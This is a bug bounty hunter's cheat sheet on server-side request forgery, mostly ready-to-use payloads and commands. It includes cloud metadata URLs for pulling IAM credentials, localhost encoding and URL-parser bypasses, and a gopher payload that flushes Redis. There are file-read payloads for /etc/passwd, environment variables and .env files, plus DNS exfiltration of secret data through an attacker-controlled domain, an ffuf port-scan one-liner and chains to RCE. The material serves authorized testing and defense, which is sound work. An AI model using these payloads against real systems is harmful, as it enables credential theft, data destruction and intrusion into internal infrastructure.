---
tags: [bugbounty, vuln/ssrf, cheatsheet, p1, p2]
aliases: [Server-Side Request Forgery, SSRF]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# SSRF — Server-Side Request Forgery

> [!tldr] Hunter Summary
> **What:** Server fetches a URL you control — cross trust boundary into internal infra.
> **Impact:** Cloud metadata theft (IAM keys), internal service access, RCE via SSRF to Redis/Gopher/SMTP.
> **Best targets:** PDF renderers, webhook URLs, image proxies, import-by-URL features.
> **Time to triage:** Confirm OOB hit first (30 sec with interactsh), then escalate.

---

## Where to Hunt

| Signal | Parameters / Features |
|--------|----------------------|
| URL params | `url=`, `uri=`, `fetch=`, `src=`, `dest=`, `redirect=`, `callback=`, `webhook=`, `image=`, `next=`, `return=`, `path=`, `continue=`, `link=`, `load=` |
| Features | PDF generators, screenshot APIs, link previewers (OG), XML/SVG processors, webhooks, import-by-URL, RSS fetchers, email template loaders |
| OAuth | `redirect_uri` server-side fetch of `/.well-known/openid-configuration` |
| Headers | `Referer`, `X-Forwarded-For`, `Host` — some backends fetch these |
| File upload | SVG files with external entity references |
| GraphQL | `query { user(avatarUrl: "http://...") }` |

---

## Step-by-Step Hunt

### Step 1 — Find URL-consuming parameters
```bash
# Use gau + grep to find URL params
gau target.com | grep -E "url=|fetch=|src=|dest=|redirect=|callback=" | head -50

# katana deep crawl
katana -u https://target.com -jc -d 5 | grep -E "url=|fetch=|src=" 
```

### Step 2 — Confirm outbound with OOB
```bash
# Start interactsh listener
interactsh-client -v
# Your payload URL: http://YOUR_ID.oast.pro/

# Test
curl "https://target.com/api/preview?url=http://YOUR_ID.oast.pro/"
# Watch interactsh for DNS/HTTP ping
```

### Step 3 — Hit cloud metadata
Once OOB confirmed, try cloud metadata endpoints:
```
# AWS IMDSv1 (no header needed)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# AWS IMDSv2 (needs token first — try v1 first)
# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# (needs Metadata-Flavor: Google header — test if server forwards headers)

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# (needs Metadata: true header)

# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/auth/token
```

### Step 4 — Try internal network
```
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
http://10.0.0.1/     (internal network guess)
http://192.168.1.1/  (router)
http://172.16.0.1/   (Docker default gateway often)
```

Common internal services to try:
```
http://127.0.0.1:2375/   Docker API
http://127.0.0.1:8500/   Consul
http://127.0.0.1:8080/   Admin panels
http://127.0.0.1:6379/   Redis
http://127.0.0.1:5432/   PostgreSQL  
http://127.0.0.1:9200/   Elasticsearch
http://127.0.0.1:2181/   ZooKeeper
```

### Step 5 — Try IP/URL parser bypass (if localhost blocked)
```
# Decimal encoding
http://2130706433/          = 127.0.0.1
http://3232235521/          = 192.168.1.1

# Octal
http://0177.0.0.01/         = 127.0.0.1

# Hex  
http://0x7f.0x0.0x0.0x1/   = 127.0.0.1
http://0x7f000001/

# Short forms
http://127.1/
http://127.0.1/

# IPv6
http://[::1]/
http://[0000::1:1337]/
http://[::]

# DNS rebinding / wildcard DNS
http://127.0.0.1.nip.io/
http://spoofed.burpcollaborator.net/

# Redirect chain: open redirect on allowlisted domain
http://trusted.com/redirect?url=http://169.254.169.254/
```

### Step 6 — URL parser differentials (Orange Tsai)
```
http://evil.com#@internal.com/
http://evil.com%23@internal.com/
http://internal.com@evil.com/
http://evil.com%09internal.com/
http://evil.com%0a@internal.com/
```

### Step 7 — Protocol schemes
```
file:///etc/passwd
dict://127.0.0.1:11211/STAT   (Memcached)
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall  (Redis)
ldap://127.0.0.1:389/
ftp://127.0.0.1/
sftp://evil.com:1337/test
tftp://evil.com:1337/test
```

---

## Payload Quick Ref

```
# OOB confirm
http://YOUR.oast.pro/

# localhost variants  
http://127.0.0.1/  http://localhost/  http://0/  http://[::1]/
http://127.1/  http://2130706433/  http://0x7f000001/
http://0177.0.0.01/  http://127.0.0.1.nip.io/

# Cloud metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Gopher → Redis (flushall)
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A

# File read
file:///etc/passwd
file:///proc/self/environ
file:///app/.env
```

---

## Blind SSRF Tactics

When response isn't returned:
- **Time delta** — TCP RST (closed port) is instant; open port hangs. Use Burp Intruder + timing.
- **Error message** — `"Connection refused"` (port closed) vs `"Protocol mismatch"` (port open, wrong protocol).
- **DNS exfil** — `http://SECRET_DATA.YOUR.oast.pro/` — data in subdomain, watch DNS.
- **Collaborator polling** — Burp Pro Collaborator catches DNS + HTTP + SMTP interactions.

---

## 2025-2026 Updates

> [!info] New SSRF surface (2025-2026)
> - **AI/LLM features:** Any feature that "fetches a URL to summarize" or "loads a document from URL" = classic SSRF. AI products are shipping these faster than security reviews.
> - **Kubernetes API server:** `http://10.96.0.1:443/api/v1/secrets` — default service IP in many K8s clusters
> - **IMDSv2 bypass:** Some apps fetch metadata endpoint with `X-Forwarded-For: 169.254.169.254` stripped — test if application adds Hop-by-Hop headers
> - **Webhook URL validation bypass:** Some apps only validate that URL returns 200 before firing — use a redirect chain
> - **AWS OIDC/IAM:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → get temp credentials → full AWS API access

---

## Chain Ideas

| SSRF → | Result |
|--------|--------|
| Cloud metadata → IAM keys | AWS/GCP full account takeover |
| Redis (gopher) → CRON write | RCE |
| Internal admin panel | Auth bypass → DB access |
| Elasticsearch `:9200` | Unauthenticated data access |
| Internal OAuth provider | Token issuance for any user |

See [[../05-chains/ssrf-to-rce]] for full chain details.

---

## Tools

| Tool | Use |
|------|-----|
| `interactsh-client` | OOB SSRF confirmation |
| `ffuf` | Port scanning via SSRF: `ffuf -u "https://t.com/api?url=http://127.0.0.1:FUZZ/" -w ports.txt` |
| Burp Collaborator | DNS/HTTP/SMTP OOB |
| `ssrfmap` | Automated SSRF exploitation |
| `gopherus` | Gopher payload generator for Redis, MySQL, SMTP |

---

## References

- Orange Tsai — A New Era of SSRF (BlackHat 2017)
- PortSwigger SSRF labs — https://portswigger.net/web-security/ssrf
- HackTricks SSRF — https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
